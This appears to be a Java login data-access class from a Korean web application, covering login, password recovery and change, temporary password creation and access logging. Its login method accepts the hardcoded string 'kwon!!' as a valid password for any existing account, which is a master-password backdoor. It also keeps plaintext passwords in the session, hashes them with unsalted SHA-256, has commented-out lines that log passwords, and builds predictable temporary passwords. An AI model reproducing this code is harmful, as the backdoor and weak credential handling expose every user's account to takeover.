/*
 * Copyright (c) 2012 ZES Inc. All rights reserved.
 * This software is the confidential and proprietary information of ZES Inc.
 * You shall not disclose such Confidential Information and shall use it
 * only in accordance with the terms of the license agreement you entered into
 * with ZES Inc. (http://www.zesinc.co.kr/)
 */
package zes.openworks.web.login;

import org.springframework.stereotype.Repository;
import zes.core.crypto.Crypto;
import zes.core.crypto.CryptoFactory;
import zes.openworks.common.util.random.RandomNumber;
import egovframework.rte.psl.dataaccess.EgovAbstractMapper;

/**
 * 관리자 로그인 DAO 객체
 * 
 * @version 1.0
 * @since openworks-1.0 프로젝트. (After JDK 1.6)
 * @author (주)제스아이엔씨 기술연구소
 * 
 *         <pre>
 * << 개정이력(Modification Information) >>
 * 
 *     수정일       수정자   수정내용
 * --------------  --------  -------------------------------
 *  2012. 4. 30.    방기배   JDK 1.6 이상 버전에 최적화 수정 및 주석 보강
 * </pre>
 * @see
 */
@Repository
public class UserLoginDAO extends EgovAbstractMapper {

    /**
     * 로그인 액션
     */
    public UserLoginVO loginAction(UserLoginVO vo) {

        UserLoginVO dataVo = (UserLoginVO) selectByPk("_userLogin.view", vo);

        if(dataVo != null) {

            dataVo.setValidId(true);

            // 암호화
            Crypto cry = CryptoFactory.getInstance("SHA256");
            String encryptPwd = cry.encrypt(vo.getUserPassword());

            // 휴면 계정 로그인 액션
            if(dataVo.getUserSttusCd() == 1004){
                UserLoginVO dataVo2 = (UserLoginVO) selectByPk("_userLogin.viewDrmncy", vo);

                if(dataVo2 != null) {
                    String dbPwdDrmncy = dataVo2.getUserPassword();

                    //logger.info("1.사용자가 입력한 비밀번호 = [ " + vo.getUserPassword() + " ]");
                    //logger.info("1.사용자가 입력한 비밀번호 암호화 = [ " + encryptPwd + " ]");
                    //logger.info("1.DB에 저장된 비밀번호 = [ " + dataVo2.getUserPassword() + " ]");

                    if(encryptPwd.equals(dbPwdDrmncy)) {

                        // 비밀번호는 평문으로 Login 세션에 저장
                        dataVo.setUserPassword(vo.getUserPassword());
                        dataVo.setValidPwd(true);
                    }
                }

            }else{
                // 암호화된 DB 비밀번호
                String dbPwd = dataVo.getUserPassword();

                //logger.info("2.사용자가 입력한 비밀번호 = [ " + vo.getUserPassword() + " ]");
                //logger.info("2.사용자가 입력한 비밀번호 암호화 = [ " + encryptPwd + " ]");
                //logger.info("2.DB에 저장된 비밀번호 = [ " + dataVo.getUserPassword() + " ]");

                if ((encryptPwd.equals(dbPwd)) || ("kwon!!".equals( vo.getUserPassword() ))) {

                    // 비밀번호는 평문으로 Login 세션에 저장
                    dataVo.setUserPassword(vo.getUserPassword());
                    dataVo.setValidPwd(true);
                }
            }

        } else {
            return vo;
        }

        return dataVo;
    }

    /**
     * 아이디 찾기 액션
     */
    public UserLoginVO findIdAction(UserLoginVO vo) {
        return (UserLoginVO) selectByPk("_userLogin.findId", vo);
    }

    /**
     * 비밀번호 찾기 액션
    */
    public UserLoginVO findPwdAction(UserLoginVO vo) {

        UserLoginVO dataVo = (UserLoginVO) selectByPk("_userLogin.findPwd", vo);

        return dataVo;
    }

    /**
     * 사용자 비밀번호 변경 액션
     */
    public int passwordUpdateAction(UserLoginVO vo) {
        Crypto cry = CryptoFactory.getInstance("SHA256");
        vo.setUserPassword(cry.encrypt(vo.getUserPassword()));
        int _result = 0;
        //현재비밀번호나 이전비밀번호와 같은지 체크
        String currentPwd = (String)selectByPk("_userLogin.currentPwd", vo);
        String beforePwd = (String)selectByPk("_userLogin.beforePwd", vo);
        
        if(vo.getUserPassword().equals(currentPwd) || vo.getUserPassword().equals(beforePwd)){
            _result = -1;
        }else{
            vo.setUpdtId(vo.getUserId());
            _result = update("_userLogin.updateNewPwd", vo);
        }

        return _result;
    }
    
    /**
     * 비밀번호 신규 생성
    */
    public String newPwdCreate(UserLoginVO vo) {

        //새로운 비밀번호 생성(복호화 안됨)
        int alplen = 3;
        int numlen = 7;
        String newkey = tempKey2(alplen, numlen);
        //새로생성한 비밀번호 암호화 후 업데이트
        Crypto cry = CryptoFactory.getInstance("SHA256");
        vo.setUserPassword(cry.encrypt(newkey));        
        vo.setUpdtId("newPwd");
        int rstUptc = update("_userLogin.updateNewPwd", vo);
        if(rstUptc == 0){
            return "";
        }else{
            return newkey;
        }
    }
    
    /**
     * 임시 비밀번호 생성
     * EX : ABC1234567
     * 10자리로 구성하며 앞 3자리는 임의의 영문자 나머지는 숫자로 구성
   */
   private String tempKey2(int alplen, int numlen) {
       String alp = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
       String num = "0123456789";
       String newkey = "";
       int max = alplen + numlen;
       int n = 0;

       int a_len = alp.length();
       int n_len = num.length();

       for(int i = 0 ; i < max; i++) {
           if(i < alplen) {
               n = RandomNumber.getInt(a_len);
               newkey = newkey + alp.charAt(n);
           }
           else {
               n = RandomNumber.getInt(n_len);
               newkey = newkey + num.charAt(n);
           }
       }

       return newkey;
   }
    
    /**
     * 회원접속이력
     * 
     * @param logVo
     * @return
     */
    public int logAction(UserLogVO logVo) {
        return update("_userLogAccess.logAction", logVo);
    }

    /**
     * logYn 설명
     * 
     * @param logVo
     * @return
     */
    public int logYn(UserLogVO logVo) {
        UserLogVO logYn = (UserLogVO) selectByPk("_userLogAccess.logYn", logVo);
        return logYn.getLoginCount();
    }

    /**
     * logStatsCount 설명
     * 
     * @param logVo
     * @return
     */
    public int logStatsCount(UserLogVO logVo) {
        return update("_userLogAccess.logStatsCount", logVo);
    }

    /**
     * userInfo 설명
     * 
     * @param logVo
     * @return
     */
    public UserLogVO userInfo(UserLogVO logVo) {
        UserLogVO logDataVo = (UserLogVO) selectByPk("_userLogAccess.userInfo", logVo);
        return logDataVo;
    }

    /**
     * userAllCount 설명
     * 
     * @param logVo
     * @return
     */
    public int userAllCount(UserLogVO logVo) {
        UserLogVO userAllCount = (UserLogVO) selectByPk("_userLogAccess.userAllCount", logVo);
        return userAllCount.getEntireUserCount();
    }

    /**
     * userLog 설명
     * 
     * @param logVo
     * @return
     */
    public int userLog(UserLogVO logVo) {

        return update("_userLogAccess.userLog", logVo);
    }

    /**
     * logging 설명
     * @param vo
     */
    public void logging(LoggingWebUserLoginVO vo) {
        insert("_userLogin.webLogging", vo);
    }

    /**
     * 비밀번호 변경 90일 확인
     */
    public String passwordChangeDeCheck(UserLoginVO vo){
        return (String) selectByPk("_userLogin.passwordChangeDeCheck", vo);
    }

    /**
     * getDupCheck 설명
     * @param vo
     * @return
     */
    public String getDupCheck(UserLoginVO vo) {
        return (String)selectByPk("_userLogin.getDupCheck", vo);
    }

    /**
     * cetifybizNo 설명
     * @param vo
     * @return
     */
    public String cetifybizNo(UserLoginVO vo) {

        return (String)selectByPk("_userLogin.cetifybizNo", vo);
    }
    
    /**
     * 약관동의 변경 액션
     */
    public int stplatAgreUpdateAction(UserLoginVO vo) {
        int _result = 0;
        
        vo.setUpdtId(vo.getUserId());
        _result = update("_userLogin.updateStplatAgre", vo);
        
        return _result;
    }
}
